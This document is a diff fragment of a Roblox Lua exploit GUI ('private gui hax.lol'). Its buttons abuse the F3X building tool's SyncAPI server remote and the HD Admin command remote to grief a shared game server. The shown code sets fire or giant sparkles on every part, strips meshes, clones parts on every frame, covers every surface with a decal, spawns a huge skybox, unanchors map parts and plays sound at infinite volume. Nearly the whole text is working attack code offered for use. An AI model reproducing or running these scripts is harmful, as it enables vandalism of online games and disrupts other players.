+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local function get()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, v in pairs(ws:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				task.spawn(function()
+					call("CreateDecorations", { {
+						Part = v,
+						DecorationType = "Fire"
+					} })
+					call("SyncDecorate", { {
+						Part = v,
+						DecorationType = "Fire",
+						Size = 5,
+						Color = Color3.new(1, 0.5, 0),
+						SecondaryColor = Color3.new(1, 0.1, 0)
+					} })
+				end)
+			end
+		end
+	end)
+end;
+task.spawn(C_8d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_8f()
+local script = G2L["8f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local plr = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local me = plr.LocalPlayer
+	
+		local function get()
+			for _, obj in pairs(me:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, v in pairs(ws:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				task.spawn(function()
+					call("CreateDecorations", { {
+						Part = v,
+						DecorationType = "Sparkles",
+						Size = 1000,
+						Color = Color3.new(1, 1, 1)
+					} })
+				end)
+			end
+		end
+	end)
+end;
+task.spawn(C_8f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_91()
+local script = G2L["91"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+	
+		local tool
+	
+		for i, v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		for i, v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		function MovePart(part, cf)
+			local args = { [1] = "SyncMove", [2] = { [1] = { ["Part"] = part, ["CFrame"] = cf } } }
+			_(args)
+		end
+	
+		local skyboxPart
+	
+		for i, v in game.Workspace:GetDescendants() do
+			if v:IsA("BasePart") and v:FindFirstChildWhichIsA("SpecialMesh") then
+				local mesh = v:FindFirstChildWhichIsA("SpecialMesh")
+				if mesh.MeshId == "rbxassetid://111891702759441" then
+					skyboxPart = v
+					break
+				end
+			end
+		end
+	
+		if skyboxPart then
+			local originalPos = skyboxPart.CFrame.Position
+			local RunService = game:GetService("RunService")
+	
+			local angleX = 0
+			local angleY = 0
+			local angleZ = 0
+	
+			RunService.Heartbeat:Connect(function(dt)
+				pcall(function()
+					angleX = angleX + (math.random(25, 37) * dt)
+					angleY = angleY + (math.random(25, 37) * dt)
+					angleZ = angleZ + (math.random(25, 37) * dt)
+	
+					if angleX >= 360 then angleX = angleX - 360 end
+					if angleY >= 360 then angleY = angleY - 360 end
+					if angleZ >= 360 then angleZ = angleZ - 360 end
+	
+					MovePart(skyboxPart, CFrame.new(originalPos) * CFrame.Angles(math.rad(angleX), math.rad(angleY), math.rad(angleZ)))
+				end)
+			end)
+		end
+	
+	end)
+	
+end;
+task.spawn(C_91);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_93()
+local script = G2L["93"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- Credits to whoever made the f3x call function template and credits to remote spy for some scripts xd
+	
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local Players = game:GetService("Players")
+		local workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		for _, stupidguy in ipairs(workspace:GetDescendants()) do
+	
+	
+			task.spawn(function()
+				call({ "CreateMeshes", { { Part = stupidguy } } })
+			end)
+	
+			task.spawn(function()
+				call({
+					"SyncMesh",
+					{{
+						Part = stupidguy,
+						MeshId = "rbxassetid://12902786354",
+					}}
+				})
+			end)
+			game:GetService("RunService").Heartbeat:Connect(function()
+				local clonething = {
+					[1] = "Clone",
+					[2] = {
+						[1] = stupidguy
+					},
+					[3] = game.Workspace
+				}
+	
+				remote:InvokeServer(unpack(clonething))
+	
+			end)
+		end
+	end)
+end;
+task.spawn(C_93);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_95()
+local script = G2L["95"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "132628896872785"
+	end)
+end;
+task.spawn(C_95);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_9a()
+local script = G2L["9a"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local RunService = game:GetService("RunService")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+	
+		local tool
+		for _,v in ipairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then tool = v.Parent end
+		end
+		for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
+			if v.Name == "SyncAPI" then tool = v.Parent end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function SetLock(part,bool)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = bool
+			}
+			_(args)
+		end
+	
+		local function CreatePart(cf,parent) _( {"CreatePart","Ball",cf,parent} ) end
+		local function MovePart(part,cf) _( {"SyncMove",{ {Part=part, CFrame=cf} } } ) end
+		local function Resize(part,size,cf) _( {"SyncResize",{ {Part=part, Size=size, CFrame=cf} } } ) end
+		local function SetAnchor(bool,part) _( {"SyncAnchor",{ {Part=part, Anchored=bool} } } ) end
+		local function SetCollision(part,bool) _( {"SyncCollision",{ {Part=part, CanCollide=bool} } } ) end
+		local function SetName(part,name) _( {"SetName",{part},name} ) end
+		local function Color(part,color) _( {"SyncColor",{ {Part=part, Color=color, UnionColoring=false} } } ) end
+	
+		function AddFire(part, size, color, color2, heat)
+			local createArgs = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+	
+			local syncArgs = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = size,
+						["Heat"] = 14,
+						["Color"] = color,
+						["SecondaryColor"] = color2
+					}
+				}
+			}
+	
+			_(createArgs)
+			_(syncArgs)
+	
+		end
+	
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SyncMaterial(part,material)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = material
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function ClonePart(part, parent)
+			local args = {
+				[1] = "Clone",
+				[2] = {
+					[1] = part
+				},
+				[3] = parent
+			}
+	
+			_(args)
+		end
+	
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+	
+	
+	
+	
+		task.spawn(function()
+			local radius = 5
+			local verticalAmplitude = 3 
+			local speed = math.rad(100)
+			local angle = 0
+	
+			local initialCF = hrp.CFrame * CFrame.new(radius, -0.1, 0)
+			task.spawn(function() CreatePart(initialCF, workspace) end)
+	
+			local ball
+			repeat task.wait()
+				for _,v in ipairs(workspace:GetDescendants()) do
+					if v:IsA("BasePart") and (v.Position - initialCF.Position).Magnitude < 0.1 then
+						ball = v
+						break
+					end end
+			until ball
+			game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";title me ".. player.Name .."'s iOrb")
+			ClonePart(char.Head, workspace)
+			game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";untitle me")
+	
+	
+	
+			local head = workspace:FindFirstChild("Head")
+			task.spawn(function() SetTrans(head,1) end)
+			task.spawn(function() SetAnchor(true, head) end)
+			task.spawn(function() MovePart(head, ball.CFrame) end)
+	
+	
+	
+	
+	
+			task.spawn(function() DestroyPart(head.face) end)
+			task.spawn(function() SetName(head,"Billboard GUI") end)
+			task.spawn(function() SetName(ball,"iOrb") end)
+			task.spawn(function() Resize(ball, Vector3.new(0.9,0.9,0.9), initialCF) end)
+			task.spawn(function() Color(ball, Color3.new(0, 0, 0)) end)
+			task.spawn(function() SetCollision(ball, false) end)
+			task.spawn(function() SetCollision(head, false) end)
+			task.spawn(function() SetLock(ball,true) end)
+			task.spawn(function() SyncMaterial(ball, Enum.Material.Neon) end)
+			task.spawn(function() AddFire(ball, 0.5, Color3.new(0, 0, 0), Color3.new(0, 0, 0)) end)
+	
+	
+			RunService.Heartbeat:Connect(function(dt)
+				angle = angle + dt * speed
+				local x = math.cos(angle) * radius
+				local z = math.sin(angle) * radius
+				local y = 2 + math.sin(angle*2) * verticalAmplitude
+	
+				local lookDir = Vector3.new(-math.sin(angle), math.cos(angle*2)*0.1, math.cos(angle))    
+				local newCF = CFrame.new(hrp.Position + Vector3.new(x,y,z), hrp.Position + Vector3.new(x,y,z) + lookDir)    
+				task.spawn(function() MovePart(ball, newCF) end) task.spawn(function() MovePart(head, newCF) end) end)
+		end)
+	end)
+end;
+task.spawn(C_9a);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_9c()
+local script = G2L["9c"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+		local rs = game:GetService("ReplicatedStorage")
+	
+		local player = Players.LocalPlayer
+	
+		local function get()
+			for _, obj in pairs(player:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			for _, obj in pairs(rs:GetDescendants()) do
+				if obj.Name == "SyncAPI" then
+					return obj.Parent
+				end
+			end
+			return nil
+		end
+	
+		local hax = get()
+		if not hax then return end
+	
+		local r = hax.SyncAPI.ServerEndpoint
+	
+		local function call(...)
+			return r:InvokeServer(...)
+		end
+	
+		for _, v in pairs(ws:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				task.spawn(function()
+					call("CreateDecorations", { {
+						Part = v,
+						DecorationType = "Fire"
+					} })
+					call("SyncDecorate", { {
+						Part = v,
+						DecorationType = "Fire",
+						Size = 1000,
+						Color = Color3.new(1, 0.5, 0),
+						SecondaryColor = Color3.new(1, 0.1, 0)
+					} })
+				end)
+			end
+		end
+	end)
+end;
+task.spawn(C_9c);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_9e()
+local script = G2L["9e"];
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.TextBoxDecal.Text = "109572115751921"
+	end)
+end;
+task.spawn(C_9e);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_a0()
+local script = G2L["a0"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function ohno(args)
+			task.spawn(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local partAllthingy = {}
+		for _, part in pairs(workspace:GetDescendants()) do
+			if part:IsA("BasePart") and part.Name ~= "Terrain" and part.Name ~= "kys" then
+				table.insert(partAllthingy, part)
+			end
+		end
+	
+		for _, part in pairs(partAllthingy) do
+			task.spawn(function()
+				for _, mesh in pairs(part:GetChildren()) do
+					if mesh:IsA("SpecialMesh") or mesh:IsA("BlockMesh") or mesh:IsA("CylinderMesh") then
+						ohno({"Remove", {mesh}})
+					end
+				end
+			end)
+		end
+	end)
+end;
+task.spawn(C_a0);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_a2()
+local script = G2L["a2"];
+	script.Parent.MouseButton1Click:Connect(function()
+		rq=game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent
+	
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function mat(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+		function clone(part,parent)
+			local args = {
+				[1] = "Clone",
+				[2] = {
+					[1] = part
+				},
+				[3] = parent
+			}
+	
+			return remote:InvokeServer(unpack(args))
+		end
+		function SetMeshType(part, meshType)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshType"] = meshType
+					}
+				}
+			}
+			_(args)
+		end
+		rq:InvokeServer(";title me " ..player.DisplayName.."'s i0rb")
+	
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character or player.CharacterAdded:Wait()
+		local humanrFr = char:WaitForChild("HumanoidRootPart")
+		local angle = 0
+		local radius = 6
+		local heightOffset = 2
+	
+		local cf = humanrFr.CFrame * CFrame.new(radius, heightOffset, 0)
+		local pad = remote:InvokeServer("CreatePart", "Ball", cf, workspace)
+		clone(char.Head,pad)
+	
+		rq:InvokeServer(";untitle")
+		spawn(function()
+			Resize(pad, Vector3.new(1, 1, 1), cf)
+		end)
+		spawn(function()
+			SetAnchor(true, pad)
+		end)
+		spawn(function()
+			mat(pad, Enum.Material.Neon)
+		end)
+		spawn(function()
+			SetCollision(pad, false)
+		end)
+		spawn(function()
+			SetName(pad, "Orbit-(Blue2spookified-Version)")
+		end)
+		spawn(function()
+			AddMesh(pad)
+		end)
+		spawn(function()
+			SetMeshType(pad, "Sphere")
+		end)
+		spawn(function()
+			MeshResize(pad, Vector3.new(1, 1, 1))
+		end)
+		spawn(function()
+			Color(pad, Color3.fromRGB(0, 0, 0))
+		end)
+	
+		local name = pad.Head
+		spawn(function()
+			SetAnchor(true, name)
+		end)
+		spawn(function()
+			SetTrans(name, 1)
+		end)
+		spawn(function()
+			DestroyPart(name.face)
+		end)
+		spawn(function()
+			SetCollision(name, false)
+		end)
+	
+	
+		local radius = 5
+		local speed = 2
+		local t = 0
+	
+		game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
+			if pad and humanrFr then
+				t = t + deltaTime * speed
+	
+				local x = math.cos(t) * radius
+				local y = math.sin(t * 1.5) * radius * 0.5
+				local z = math.sin(t) * radius
+	
+				local offset = Vector3.new(x, y, z)
+				local newCF = CFrame.new(humanrFr.Position + offset)
+				spawn(function()
+					spawn(function()
+						MovePart(pad, newCF)
+					end)
+					spawn(function()
+						MovePart(name, newCF)
+					end)
+				end)
+			end
+		end)
+		local e = CFrame.new(0,0,0)
+	
+		while true do
+			if char.Humanoid.Health == 0 then return end
+			spawn(function()
+				local p2 = remote:InvokeServer("CreatePart", "Normal", e, pad)
+	
+				spawn(function()
+					Resize(p2, Vector3.new(0.3, 0.3, 0.3), pad.CFrame)
+				end)
+				spawn(function()
+					SetAnchor(true, p2)
+				end)
+				spawn(function()
+					SetCollision(p2, false)
+				end)
+				spawn(function()
+					Color(p2, Color3.fromRGB(0, 0, 0))
+				end)
+				spawn(function()
+					SetTrans(p2, 0.3)
+				end)
+				spawn(function()
+					mat(p2, Enum.Material.Neon)
+				end)
+				wait(0.5)
+				DestroyPart(p2)
+			end)
+			wait(0.0005)
+		end
+	end)
+end;
+task.spawn(C_a2);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+function C_a4()
+local script = G2L["a4"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- V3rmillion hack script F3X by @Elv4r0x
+		-- dont steal or confirmed their own
+		-- u can edit ts but give credit
+	
+		game.ReplicatedStorage.HDAdminHDClient.Signals.RequestCommandSilent:InvokeServer(";btools ;btools")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	
+		local decalID = "73053804512950"
+		local id = decalID
+	
+		local player = Players.LocalPlayer
+	
+		local tool = nil
+		for _, v in pairs(player:GetDescendants()) do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+				break
+			end
+		end
+	
+		if not tool then
+			for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+				if v.Name == "SyncAPI" then
+					tool = v.Parent
+					break
+				end
+			end
+		end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local allParts = {}
+		for _, v in pairs(Workspace:GetDescendants()) do
+			if v:IsA("BasePart") and v.Name ~= "Terrain" and v.Name ~= "kys" then
+				table.insert(allParts, v)
+			end
+		end
+	
+		local faces = {"Front", "Back", "Right", "Left", "Bottom", "Top"}
+		local faceEnums = {
+			Front = Enum.NormalId.Front,
+			Back = Enum.NormalId.Back,
+			Right = Enum.NormalId.Right,
+			Left = Enum.NormalId.Left,
+			Bottom = Enum.NormalId.Bottom,
+			Top = Enum.NormalId.Top
+		}
+	
+		for _, faceName in pairs(faces) do
+			task.defer(function()
+				local faceEnum = faceEnums[faceName]
+				local createList = {}
+				local addList = {}
+				for i = 1, #allParts do
+					local part = allParts[i]
+					createList[i] = {Part = part, Face = faceEnum, TextureType = "Decal"}
+					addList[i] = {Part = part, Face = faceEnum, TextureType = "Decal", Texture = "rbxassetid://" .. id}
+				end
+				remote:InvokeServer('CreateTextures', createList)
+				remote:InvokeServer('SyncTexture', addList)
+			end)
+		end
+	
+		local function send(args)
+			remote:InvokeServer(unpack(args))
+		end
+	
+		local function setCollision(part, bool)
+			task.defer(function() send({"SyncCollision", {{Part = part, CanCollide = bool}}}) end)
+		end
+	
+		local function setAnchor(bool, part)
+			task.defer(function() send({"SyncAnchor", {{Part = part, Anchored = bool}}}) end)
+		end
+	
+		local function newPart(cf, parent)
+			task.defer(function() send({"CreatePart", "Normal", cf, parent}) end)
+		end
+	
+		local function killPart(part)
+			task.defer(function() send({"Remove", {part}}) end)
+		end
+	
+		local function movePart(part, cf)
+			task.defer(function() send({"SyncMove", {{Part = part, CFrame = cf}}}) end)
+		end
+	
+		local function resizePart(part, sz, cf)
+			task.defer(function() send({"SyncResize", {{Part = part, CFrame = cf, Size = sz}}}) end)
+		end
+	
+		local function addMeshToPart(part)
+			task.defer(function() send({"CreateMeshes", {{Part = part}}}) end)
+		end
+	
+		local function changeMesh(part, meshId)
+			task.defer(function() send({"SyncMesh", {{Part = part, MeshId = "rbxassetid://" .. meshId}}}) end)
+		end
+	
+		local function changeTexture(part, texId)
+			task.defer(function() send({"SyncMesh", {{Part = part, TextureId = "rbxassetid://" .. texId}}}) end)
+		end
+	
+		local function renamePart(part, newName)
+			task.defer(function() send({"SetName", {part}, newName}) end)
+		end
+	
+		local function scaleMesh(part, scaleVal)
+			task.defer(function() send({"SyncMesh", {{Part = part, Scale = scaleVal}}}) end)
+		end
+	
+		local function weldParts(partA, partB, leader)
+			task.defer(function() send({"CreateWelds", {partA, partB}, leader}) end)
+		end
+	
+		local function lockPart(part, bool)
+			task.defer(function() send({"SetLocked", {part}, bool}) end)
+		end
+	
+		local function setTransparency(part, val)
+			task.defer(function() send({"SyncMaterial", {{Part = part, Transparency = val}}}) end)
+		end
+	
+		local function addSpotlight(part)
+			task.defer(function() send({"CreateLights", {{Part = part, LightType = "SpotLight"}}}) end)
+		end
+	
+		local function setLightBrightness(part, brightness)
+			task.defer(function() send({"SyncLighting", {{Part = part, LightType = "SpotLight", Brightness = brightness}}}) end)
+		end
+	
+		local function recolorPart(part, colorVal)
+			task.defer(function() send({"SyncColor", {{Part = part, Color = colorVal, UnionColoring = false}}}) end)
+		end
+	
+		local function spawnDecalOnFace(part, side)
+			task.defer(function() send({"CreateTextures", {{Part = part, Face = side, TextureType = "Decal"}}}) end)
+		end
+	
+		local function addDecalToFace(part, assetId, side)
+			task.defer(function() send({"SyncTexture", {{Part = part, Face = side, TextureType = "Decal", Texture = "rbxassetid://" .. assetId}}}) end)
+		end
+	
+		for i = 1, #allParts do
+			task.defer(setTransparency, allParts[i], 0)
+		end
+	
+		local id = "73053804512950"
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					remote:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			ohno({"Remove", { hack }})
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
+		local hrp = char:WaitForChild("HumanoidRootPart")
+		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
+	
+		local sky = remote:InvokeServer("CreatePart", "Normal", cf, Workspace)
+	
+		ohno({"SyncAnchor", { { Part = sky, Anchored = true } }})
+		ohno({"SyncCollision", { { Part = sky, CanCollide = false } }})
+		ohno({"CreateMeshes", { { Part = sky } }})
+		ohno({"SyncMesh", { {
+			Part = sky,
+			MeshId = "rbxassetid://111891702759441",
+			TextureId = "rbxassetid://" .. id,
+			Scale = Vector3.new(100999, 100999, 100999),
+			VertexColor = Vector3.new(4, 4, 4)
+		} }})
+		ohno({"SetLocked", { sky }, true})
+		ohno({"SetName", { sky }, "kys"})
+		ohno({"SyncMaterial", { { Part = sky, Transparency = tonumber(trans) } }})
+		ohno({"SyncMove", { { Part = sky, CFrame = cf } }})
+	
+		RequestCommand:InvokeServer(";sound 1840712882 ;volume inf")
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function ohno(args)
+			task.defer(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function setanchor(part, boolean)
+			ohno({"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}})
+		end
+	
+		local function unanchorall()
+			local anti = {}
+			for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+				local character = plr.Character
+				if character then
+					for _, part in ipairs(character:GetDescendants()) do
+						if part:IsA("BasePart") or part:IsA("UnionOperation") then
+							anti[part] = true
+						end
+					end
+				end
+			end
+	
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" and not anti[v] then
